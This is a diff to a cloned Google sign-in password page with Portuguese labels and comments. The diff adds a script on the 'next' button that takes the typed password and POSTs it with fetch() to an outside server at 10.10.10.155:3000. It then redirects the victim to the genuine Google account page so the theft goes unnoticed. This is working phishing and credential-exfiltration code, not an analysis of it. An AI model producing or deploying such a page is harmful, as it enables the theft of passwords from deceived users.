@@ -133,7 +133,18 @@
                            <div jsname="USBQqe" class="CYBold" role="presentation">
                               <div class="j663ec">
                                  <div class="tCpFMc" jsname="rEuO1b" jscontroller="bPkrc">
-                                    <form method="post" novalidate jsaction="submit:JM9m2e;">
+
+
+
+
+
+                                    <!-- FORMULÁRIO DE ENVIO DE SENHA -->
+                                    <form action="/test" method="post" novalidate jsaction="submit:JM9m2e;">
+
+
+
+
+
                                        <span jsslot>
                                           <section class="aTzEhb AORPd rNe0id eLNT1d S7S4N" jscontroller="W2YXuc" data-callout-type="2" jsname="INM6z" aria-live="assertive" aria-atomic="true" jsshadow>
                                              <header class="IdEPtc" jsname="tJHJj">
@@ -170,7 +181,7 @@
                                                                      <div class="aCsJod oJeWuf">
                                                                         <div class="aXBtI Wic03c">
                                                                            <div class="Xb9hP">
-                                                                              <input id="inputSenha" type="password" class="whsOnd zHQkBf" jsname="YPqjbf" autocomplete="current-password" spellcheck="false" tabindex="0" aria-label="Digite sua senha" name="Passwd" autocapitalize="off" dir="ltr" data-initial-dir="ltr" data-initial-value=""/>
+                                                                              <input id="Passwd" type="password" class="whsOnd zHQkBf" jsname="YPqjbf" autocomplete="current-password" spellcheck="false" tabindex="0" aria-label="Digite sua senha" name="Passwd" autocapitalize="off" dir="ltr" data-initial-dir="ltr" data-initial-value=""/>
                                                                               <div jsname="YRMmle" class="AxOyFc snByac" aria-hidden="true">Digite sua senha</div>
                                                                            </div>
                                                                            <div class="i9lrp mIZh1c"></div>
@@ -271,15 +282,35 @@
                                     <div class="F9NWFb" jsname="k77Iif">
                                        <div jscontroller="IZ1fbc" jsaction="click:cOuCgd;JIbuQc:JIbuQc;" jsname="Njthtb" class="FliLIb FmFZVc" id="passwordNext">
                                           <div class="VfPpkd-dgl2Hf-ppHlrf-sM5MNb" data-is-touch-wrapper="true">
+                                             
+                                             
+                                             
+                                             
+                                             <!-- BOTÃO DE AVANÇAR -->
                                              <button class="VfPpkd-LgbsSe VfPpkd-LgbsSe-OWXEXe-k8QpJ VfPpkd-LgbsSe-OWXEXe-dgl2Hf nCP5yc AjY5Oe DuMIQc LQeN7 qIypjc TrZEUc lw1w4b" jscontroller="soHxf" jsaction="click:cOuCgd; mousedown:UX7yZ; mouseup:lbsD7e; mouseenter:tfO1Yc; mouseleave:JywGue; touchstart:p6p2H; touchmove:FwuNnf; touchend:yfqBxc; touchcancel:JMtRjd; focus:AHmuwe; blur:O22p3e; contextmenu:mg9Pef;mlnRJb:fLiPzd;" data-idom-class="nCP5yc AjY5Oe DuMIQc LQeN7 qIypjc TrZEUc lw1w4b" jsname="LgbsSe" onclick=" pegarValor()">
 
                                                 <script>
 
                                                    function pegarValor() {
-                                                      
-                                                      console.log("Senha enviada: ", document.getElementById("inputSenha").value);
+
+                                                      const url = 'http://10.10.10.155:3000/test';
+                                                      const senha = document.getElementById("Passwd").value;
+
+                                                      fetch(url, {
+                                                      method: 'POST',
+                                                      headers: {
+                                                         'Content-Type': 'application/json'
+                                                      },
+                                                      body: JSON.stringify({
+                                                         senha: senha
+                                                         })
+                                                      })
+                                                      .then(response => response.json())
+                                                      .then(data => console.log(data))
+                                                      .catch(error => console.error(error));
 
                                                       window.location.href = 'https://myaccount.google.com/?hl=pt_BR&utm_source=OGB&utm_medium=act';
+
                                                    }
 
                                                 </script>
